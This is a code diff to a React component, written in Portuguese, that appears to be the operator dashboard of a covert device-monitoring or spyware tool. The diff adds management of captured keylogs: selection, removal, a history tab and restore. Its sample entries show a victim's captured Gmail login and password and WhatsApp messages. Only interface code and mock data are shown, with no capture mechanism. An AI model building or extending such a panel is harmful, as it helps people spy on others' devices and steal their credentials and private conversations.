@@ -10,6 +10,13 @@ interface DeviceDetailsProps {
   onBack: () => void;
 }
 
+interface Keylog {
+  id: string;
+  time: string;
+  key: string;
+  app: string;
+}
+
 export default function DeviceDetails({
   deviceId,
   deviceName,
@@ -19,6 +26,15 @@ export default function DeviceDetails({
   const [isLiveActive, setIsLiveActive] = useState(true);
   const [isControlActive, setIsControlActive] = useState(false);
   const [isScreenLocked, setIsScreenLocked] = useState(false);
+  const [keylogs, setKeylogs] = useState<Keylog[]>([
+    { id: "1", time: "14:32:15", key: "admin@gmail.com", app: "Gmail" },
+    { id: "2", time: "14:32:18", key: "senha123", app: "Gmail" },
+    { id: "3", time: "14:35:42", key: "Olá, tudo bem?", app: "WhatsApp" },
+    { id: "4", time: "14:36:01", key: "Sim, tudo certo!", app: "WhatsApp" },
+    { id: "5", time: "14:38:15", key: "www.google.com", app: "Chrome" },
+  ]);
+  const [keylogHistory, setKeylogHistory] = useState<Keylog[]>([]);
+  const [selectedKeylogs, setSelectedKeylogs] = useState<Set<string>>(new Set());
 
   const handleScreenshot = () => {
     alert(`📸 Screenshot capturado de ${deviceName}`);
@@ -52,6 +68,46 @@ export default function DeviceDetails({
     if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
       alert(`❌ Dispositivo ${deviceName} removido com sucesso`);
       onBack();
+    }
+  };
+
+  const handleToggleKeylogSelection = (id: string) => {
+    const newSelected = new Set(selectedKeylogs);
+    if (newSelected.has(id)) {
+      newSelected.delete(id);
+    } else {
+      newSelected.add(id);
+    }
+    setSelectedKeylogs(newSelected);
+  };
+
+  const handleRemoveSelectedKeylogs = () => {
+    if (selectedKeylogs.size === 0) {
+      alert("Selecione pelo menos um keylog para remover");
+      return;
+    }
+    const toRemove = keylogs.filter((k) => selectedKeylogs.has(k.id));
+    setKeylogHistory([...keylogHistory, ...toRemove]);
+    setKeylogs(keylogs.filter((k) => !selectedKeylogs.has(k.id)));
+    setSelectedKeylogs(new Set());
+    alert(`✅ ${toRemove.length} keylog(s) removido(s) e movido(s) para o histórico`);
+  };
+
+  const handleRemoveAllKeylogs = () => {
+    if (confirm("Tem certeza que deseja remover TODOS os keylogs?")) {
+      setKeylogHistory([...keylogHistory, ...keylogs]);
+      setKeylogs([]);
+      setSelectedKeylogs(new Set());
+      alert("✅ Todos os keylogs foram removidos e movidos para o histórico");
+    }
+  };
+
+  const handleRestoreKeylog = (id: string) => {
+    const toRestore = keylogHistory.find((k) => k.id === id);
+    if (toRestore) {
+      setKeylogs([...keylogs, toRestore]);
+      setKeylogHistory(keylogHistory.filter((k) => k.id !== id));
+      alert(`✅ Keylog restaurado com sucesso`);
     }
   };
 
@@ -148,6 +204,12 @@ export default function DeviceDetails({
             className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
           >
             ⌨️ Keylogs
+          </TabsTrigger>
+          <TabsTrigger
+            value="history"
+            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
+          >
+            📜 Histórico
           </TabsTrigger>
         </TabsList>
 
@@ -306,29 +368,81 @@ export default function DeviceDetails({
 
         {/* Aba: Keylogs */}
         <TabsContent value="keylogs" className="space-y-4">
+          <div className="flex gap-2 mb-4">
+            <Button
+              onClick={handleRemoveSelectedKeylogs}
+              disabled={selectedKeylogs.size === 0}
+              className="bg-red-600 hover:bg-red-700 text-white"
+            >
+              🗑️ Remover Selecionados ({selectedKeylogs.size})
+            </Button>
+            <Button
+              onClick={handleRemoveAllKeylogs}
+              disabled={keylogs.length === 0}
+              className="bg-red-700 hover:bg-red-800 text-white"
+            >
+              ⚠️ Remover Todos
+            </Button>
+          </div>
           <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">⌨️ Histórico de Keylogs</h3>
-            <div className="space-y-2 max-h-96 overflow-y-auto">
-              {[
-                { time: "14:32:15", key: "admin@gmail.com", app: "Gmail" },
-                { time: "14:32:18", key: "senha123", app: "Gmail" },
-                { time: "14:35:42", key: "Olá, tudo bem?", app: "WhatsApp" },
-                { time: "14:36:01", key: "Sim, tudo certo!", app: "WhatsApp" },
-                { time: "14:38:15", key: "www.google.com", app: "Chrome" },
-              ].map((log, idx) => (
-                <div
-                  key={idx}
-                  className="flex justify-between items-center p-3 bg-slate-700 rounded border border-slate-600"
-                >
-                  <div>
-                    <p className="text-slate-300">
-                      <span className="text-cyan-400">{log.app}</span>: {log.key}
-                    </p>
-                    <p className="text-slate-500 text-xs">{log.time}</p>
+            <h3 className="text-cyan-400 font-bold mb-4">⌨️ Keylogs Ativos ({keylogs.length})</h3>
+            {keylogs.length === 0 ? (
+              <p className="text-slate-400 text-center py-8">Nenhum keylog disponível</p>
+            ) : (
+              <div className="space-y-2 max-h-96 overflow-y-auto">
+                {keylogs.map((log) => (
+                  <div
+                    key={log.id}
+                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
+                  >
+                    <input
+                      type="checkbox"
+                      checked={selectedKeylogs.has(log.id)}
+                      onChange={() => handleToggleKeylogSelection(log.id)}
+                      className="w-4 h-4 cursor-pointer"
+                    />
+                    <div className="flex-1">
+                      <p className="text-slate-300">
+                        <span className="text-cyan-400">{log.app}</span>: {log.key}
+                      </p>
+                      <p className="text-slate-500 text-xs">{log.time}</p>
+                    </div>
                   </div>
-                </div>
-              ))}
-            </div>
+                ))}
+              </div>
+            )}
+          </Card>
+        </TabsContent>
+
+        {/* Aba: Histórico */}
+        <TabsContent value="history" className="space-y-4">
+          <Card className="bg-slate-800 border-slate-700 p-6">
+            <h3 className="text-cyan-400 font-bold mb-4">📜 Histórico de Keylogs Removidos ({keylogHistory.length})</h3>
+            {keylogHistory.length === 0 ? (
+              <p className="text-slate-400 text-center py-8">Nenhum keylog no histórico</p>
+            ) : (
+              <div className="space-y-2 max-h-96 overflow-y-auto">
+                {keylogHistory.map((log) => (
+                  <div
+                    key={log.id}
+                    className="flex justify-between items-center p-3 bg-slate-700 rounded border border-slate-600 hover:border-yellow-500 transition"
+                  >
+                    <div>
+                      <p className="text-slate-300">
+                        <span className="text-yellow-400">{log.app}</span>: {log.key}
+                      </p>
+                      <p className="text-slate-500 text-xs">{log.time}</p>
+                    </div>
+                    <Button
+                      onClick={() => handleRestoreKeylog(log.id)}
+                      className="bg-green-600 hover:bg-green-700 text-white text-sm"
+                    >
+                      ↩️ Restaurar
+                    </Button>
+                  </div>
+                ))}
+              </div>
+            )}
           </Card>
         </TabsContent>
       </Tabs>
